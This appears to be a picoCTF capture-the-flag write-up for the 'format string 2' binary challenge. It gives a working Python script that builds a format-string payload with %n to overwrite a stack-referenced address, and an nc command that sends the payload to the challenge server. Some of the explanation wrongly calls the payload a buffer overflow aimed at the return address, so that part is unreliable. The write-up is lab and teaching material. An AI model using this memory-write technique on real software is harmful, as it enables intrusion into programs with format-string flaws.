# format string 2

```markdown
Tags: `Binary Exploitation` `format_string` `browser_webshell_solvable`
```

## **Description**

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must _change_ data on the stack!

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

## **Solution Strategy**

```python
import struct

ADDRESS = 0x404060

def pad(s):
    return s + b"X" * (1024 - len(s)-16)

exploit = b""
exploit += b"BBBBCCCC"
exploit += b"%" + str(0x67616c66 - len(exploit)).encode() + b"x"
exploit += b"%140$n"
exploit = pad(exploit)

exploit += struct.pack("Q", ADDRESS)

print(pad(exploit).decode('utf-8'))
```

* This script constructs a buffer overflow exploit payload targeting a vulnerable program.
* It defines a constant `ADDRESS` representing the target address where the exploit will attempt to write.
* The `pad` function pads a given byte string to a specific length by adding `'X'` characters to the end until it reaches the desired length.
* The exploit payload (`exploit`) is constructed by concatenating byte strings:
  * Initial padding (`b"BBBBCCCC"`) to reach the return address on the stack.
  * Format string vulnerability payload: It uses a format string vulnerability to write the value `0x67616c66` (which corresponds to the ASCII string `"flag"`) to the address pointed to by the 140th argument on the stack (`b"%140$n"`).
  * Additional padding (`pad(exploit)`) to fill the buffer up to its maximum size (1024 bytes).
  * The target address (`struct.pack("Q", ADDRESS)`) that the exploit payload aims to overwrite with the value specified above.
* Finally, it prints the exploit payload after padding, converting it from bytes to a UTF-8 encoded string for printing purposes.

## Flag

```bash
nc rhea.picoctf.net 52010 < payload
```

<figure><img src="../.gitbook/assets/Pasted image (25).png" alt=""><figcaption></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
